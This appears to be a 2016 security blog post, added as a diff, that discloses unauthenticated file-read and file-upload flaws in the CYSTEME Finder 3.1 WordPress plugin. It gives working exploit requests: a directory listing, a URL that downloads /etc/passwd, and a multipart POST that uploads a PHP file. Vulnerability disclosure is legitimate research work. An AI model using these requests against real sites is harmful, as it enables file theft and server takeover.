@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>
+    
+      CYSTEME Finder 3.1 Multiple Vulnerabilities &middot; T0w3ntum
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png">
+</head>
+
+
+  <body>
+    <nav class="nav">
+      <div class="nav-container">
+        <a href="/">
+          <h2 class="nav-title">T0w3ntum</h2>
+        </a>
+        <ul>
+          <li><a href="/about">About</a></li>
+          <li><a href="/">Posts</a></li>
+        </ul>
+    </div>
+  </nav>
+
+    <main>
+      <div class="post">
+  <div class="post-info">
+    <span>Written by</span>
+    
+        T0w3ntum
+    
+
+    
+      <br>
+      <span>on&nbsp;</span><time datetime="2016-08-28 00:00:00 -0500">August 28, 2016</time>
+    
+  </div>
+
+  <h1 class="post-title">CYSTEME Finder 3.1 Multiple Vulnerabilities</h1>
+  <div class="post-line"></div>
+
+  <h2 id="summary">Summary</h2>
+
+<p>CYSTEME Finder is a file manager plugin for Wordpress that simplifies file management without the need for FTP or other means. It comes
+in two flavors, free and pro; You can find it here: <a href="https://wordpress.org/plugins/cysteme-finder/">CYSTEME Finder, a file explorer</a></p>
+
+<p>CYSTEME fails to check cookies in the request allowing remote attackers to view, download, and upload files to any location on
+remote file system.</p>
+
+<h3 id="lfi">LFI</h3>
+
+<p>Retrieve all data in the root wordpress directory. This will return JSON.</p>
+
+<ul>
+  <li>Exploit:</li>
+</ul>
+
+<blockquote>
+  <p>http://example.com/wp-content/plugins/cysteme-finder/php/connector.php?wphome=/var/www/wordpress&amp;cmd=open&amp;init=1&amp;tree=1</p>
+</blockquote>
+
+<ul>
+  <li>Reply:</li>
+</ul>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="s2">"cwd"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="s2">"mime"</span><span class="p">:</span><span class="w"> </span><span class="s2">"directory"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"ts"</span><span class="p">:</span><span class="w"> </span><span class="mi">1471999484</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"read"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"write"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"size"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"hash"</span><span class="p">:</span><span class="w"> </span><span class="s2">"l1_Lw"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"volumeid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"l1_"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Fichiers du site"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"date"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Today 20:44"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"locked"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"dirs"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
+  </span><span class="p">},</span><span class="w">
+  </span><span class="s2">"options"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="s2">"path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Fichiers du site"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"url"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"tmbUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"disabled"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+
+    </span><span class="p">],</span><span class="w">
+    </span><span class="s2">"separator"</span><span class="p">:</span><span class="w"> </span><span class="s2">"</span><span class="se">\/</span><span class="s2">"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"copyOverwrite"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"archivers"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+      </span><span class="s2">"create"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="s2">"application</span><span class="se">\/</span><span class="s2">x-tar"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"application</span><span class="se">\/</span><span class="s2">x-gzip"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"application</span><span class="se">\/</span><span class="s2">x-bzip2"</span><span class="w">
+      </span><span class="p">],</span><span class="w">
+      </span><span class="s2">"extract"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="s2">"application</span><span class="se">\/</span><span class="s2">x-tar"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"application</span><span class="se">\/</span><span class="s2">x-gzip"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"application</span><span class="se">\/</span><span class="s2">x-bzip2"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"application</span><span class="se">\/</span><span class="s2">zip"</span><span class="w">
+      </span><span class="p">]</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">},</span><span class="w">
+  </span><span class="s2">"files"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="s2">"mime"</span><span class="p">:</span><span class="w"> </span><span class="s2">"directory"</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"ts"</span><span class="p">:</span><span class="w"> </span><span class="mi">1471999484</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"read"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"write"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"size"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"hash"</span><span class="p">:</span><span class="w"> </span><span class="s2">"l1_Lw"</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"volumeid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"l1_"</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Fichiers du site"</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"date"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Today 20:44"</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"locked"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"dirs"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="s2">"mime"</span><span class="p">:</span><span class="w"> </span><span class="s2">"text</span><span class="se">\/</span><span class="s2">plain"</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"ts"</span><span class="p">:</span><span class="w"> </span><span class="mi">1471714510</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"read"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"write"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"size"</span><span class="p">:</span><span class="w"> </span><span class="mi">813</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"hash"</span><span class="p">:</span><span class="w"> </span><span class="s2">"l1_Lmh0YWNjZXNz"</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">".htaccess"</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"phash"</span><span class="p">:</span><span class="w"> </span><span class="s2">"l1_Lw"</span><span class="p">,</span><span class="w">
+      </span><span class="s2">"date"</span><span class="p">:</span><span class="w"> </span><span class="s2">"20 Aug 2016 13:35"</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Simply replacing <strong>wphome</strong> with any other directory path will return file information for that directory.
+If you want to download that file, get the hash value for the file and include it in the following request:</p>
+
+<ul>
+  <li>Will download /etc/passwd</li>
+</ul>
+
+<blockquote>
+  <p>http://example.com/wp-content/plugins/cysteme-finder/php/connector.php?wphome=/etc&amp;cmd=file&amp;target=l1_cGFzc3dk&amp;download=1</p>
+</blockquote>
+
+<h2 id="file-upload">File Upload</h2>
+
+<p>As with downloading the files, you will need the hash value for the target directory. With the hash value, send a payload similar to the
+following.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /wordpress/wp-content/plugins/cysteme-finder/php/connector.php?wphome=/var/www/wordpress/<span class="err">&amp;</span>wpurl=http://example.com HTTP/1.1
+Host: http://example.com
+Content-Length: 314
+Origin: http://example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
+Content-Type: multipart/form-data; boundary=--------723608748
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Connection: close
+
+----------723608748
+Content-Disposition: form-data; name="cmd"
+
+upload
+----------723608748
+Content-Disposition: form-data; name="target"
+
+l1_Lw
+----------723608748
+Content-Disposition: form-data; name="upload[]"; filename="test.php"
+Content-Type: text/html
+
+<span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span> <span class="cp">?&gt;</span>
+----------723608748--
+</code></pre></div></div>
+
+<h2 id="timeline">Timeline:</h2>
+
+<ul>
+  <li>08/20/2016 - Discovered</li>
+  <li>08/24/2016 - Reported to Developer</li>
+  <li>08/28/2016 - No reply from developer.</li>
+  <li>09/01/2016 - Published on <a href="https://www.exploit-db.com/exploits/40295/">Exploit-DB</a></li>
+</ul>
+
+
+</div>
+
+<div class="pagination">
+  
+    <a href="/2016-11-06/IMF" class="left arrow">&#8592;</a>
+  
+  
+    <a href="/2016-08-22/breach-2" class="right arrow">&#8594;</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+
+    </main>
+
+    <footer>
+      <span>
+        &copy; <time datetime="2018-02-24 19:06:05 -0600">2018</time> . Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
+      </span>
+    </footer>
+  </body>
+</html>
